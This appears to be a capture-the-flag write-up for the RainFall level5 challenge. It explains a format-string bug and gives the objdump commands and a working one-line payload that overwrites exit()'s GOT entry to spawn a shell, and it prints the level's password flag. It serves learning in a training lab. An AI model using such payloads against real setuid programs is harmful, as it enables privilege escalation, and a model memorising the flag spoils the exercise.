@@ -1,0 +1,83 @@
+# Level 5
+
+## Vulnerability
+Format string vulnerability with GOT (Global Offset Table) overwrite.
+
+## Code Analysis
+As in level4, we can find an executable waiting for an input, print it and quit after press enter
+```
+level5@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
+level5@RainFall:~$ ./level5 
+ssss
+ssss
+level5@RainFall:~$ 
+
+```c
+
+void o(void) {
+    system("/bin/sh");  // Target function (never called!)
+    _exit(1);
+}
+
+void n(void) {
+    char buffer[520];
+    fgets(buffer, 512, stdin);
+    printf(buffer);  // FORMAT STRING BUG!
+    exit(1);         // Always exits
+}
+
+```
+
+## Solution Steps
+
+1. **Find target addresses**
+```bash
+   objdump -R level5
+   # 08049838 R_386_JUMP_SLOT   exit
+   
+   objdump -t level5 | grep " o"
+   # 080484a4 g     F .text    o
+```
+
+2. **Find format string position**
+```bash
+   python -c 'print "AAAA%x.%x.%x.%x"' | ./level5
+   # Output: AAAA200.b7fd1ac0.b7ff37d0.41414141
+   # Position 4 contains our address
+```
+
+3. **Strategy: Overwrite exit() GOT entry**
+   - GOT entry for `exit()`: `0x08049838`
+   - Target address `o()`: `0x080484a4`
+   - Redirect `exit()` to call `o()` instead
+
+4. **Method 1: Direct write (simpler)**
+```bash
+   (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat) | ./level5
+```
+   - `\x38\x98\x04\x08`: GOT address for exit
+   - `%134513824x`: Print 134,513,824 chars (0x080484a4 - 4)
+   - `%4$n`: Write to position 4
+
+
+5. **Get flag**
+```bash
+   cat /home/user/level6/.pass
+   d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+```
+
+## Key Concept
+**GOT Overwrite**: 
+
+The **Global Offset Table** is a section in ELF binaries that stores addresses of external functions (from shared libraries like libc).
+
+Hijack `exit()` GOT entry to redirect execution to hidden `o()` function. When `exit(1)` is called, it jumps to `o()` instead, spawning a shell.
+
+## Memory Layout
+```
+GOT Table:
+0x08049838: [exit address] → overwrite to 0x080484a4 (o function)
+```
